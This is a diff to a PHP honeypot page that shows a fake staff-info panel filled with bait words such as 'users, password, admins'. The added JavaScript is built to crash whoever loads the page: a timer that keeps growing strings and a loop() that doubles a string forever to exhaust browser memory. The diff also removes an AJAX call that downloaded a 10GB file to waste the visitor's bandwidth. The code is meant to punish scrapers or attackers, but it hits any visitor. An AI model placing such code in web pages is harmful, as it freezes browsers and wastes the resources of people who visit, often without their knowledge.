@@ -40,10 +40,10 @@ function honeypotThis($n, $type = "general", $level = "normal"){
 		<div style="margin: 5px; background-color: #e8e8e8; padding: 10px;">
 			<h3>Staff Card Info</h3>
 			
-			<strong>Name: <span id="column"></span></strong> <br />
-			<strong>Email: <span id="column1"></span></strong></strong> <br />
-			<strong>Phone: <span id="column2"></span></strong></strong> <br />
-			<strong>StaffId: <span id="column3"></span></strong></strong> <br />
+			<strong>Name: users, password, staffs, admins, departments, tools, locations, addresses, titile, posts, pages, webs, urls<span id="column"></span></strong> <br />
+			<strong>Email: users, password, staffs, admins, departments, tools, locations, addresses, titile, posts, pages, webs, urls<span id="column1"></span></strong></strong> <br />
+			<strong>Phone: <span id="column2">users, password, staffs, admins, departments, tools, locations, addresses, titile, posts, pages, webs, urls </span></strong></strong> <br />
+			<strong>StaffId: users, password, staffs, admins, departments, tools, locations, addresses, titile, posts, pages, webs, urls<span id="column3"></span></strong></strong> <br />
 		</div>
 		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
 		<script>
@@ -56,15 +56,9 @@ function honeypotThis($n, $type = "general", $level = "normal"){
 			}, 1000);
 			
 			//Please comment these line if you just want to try to yourself
-			/**/
-			$.ajax({
-				url: "https://speed.hetzner.de/10GB.bin",
-				timeout: 36600,
-				// async: false
-			});
-			
 			txt = "aaaaa,aaaaaaaaaa,aaaaa,aaaaaaaa,aaaaaaaaaaaaaa,aaaaaaaa,aaaaaaaaa,aaaaa,aaaaaaaaaaaaaaaaaaaaa";
-			while(true){
+			
+			setInterval(function(){
 				txt = txt += "aaaa,aaaaaaa,aaaaa,aaaaaaaaa,aaaaaaaaaa,aaaaaaaaaaaa,aaaaaaaaa,aaaaaaaaaaaaa,aaaaaaaaaaa,aaaaa";
 				txt = txt += "aaaaaa,aaaaaaa,aaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
 				txt = txt += "aaaaaaa,aaaaaaaaaaaa,aaaa,aaaaaaaaaaaaaaaaa,aaaaaaaaaaaa,aaaaaaaa,aaaaaaaaaaaaaa,aaaaaaaaaaa";
@@ -75,10 +69,20 @@ function honeypotThis($n, $type = "general", $level = "normal"){
 				txt = txt += "aaaa,aaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaa,aaaaaaaaaaaaaa,aaaaaaa,aaaaa,aaaaaa,aaaaaa";
 				document.getElementById("column").innerHTML = txt;
 				document.getElementById("column1").innerHTML = txt;
-				document.getElementById("column2").innerHTML = txt;
-				document.getElementById("column3").innerHTML = txt;
+				
+			}, 20);
+			
+			var x = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+			setTimeout(function(){
+				loop();
+			}, 500);
+			
+			function loop(){
+				while(true){
+					x = x += x;
+					document.getElementById("column3").innerHTML = x;
+				}
 			}
-			/**/
 		</script>
 		<?php
 		}else{
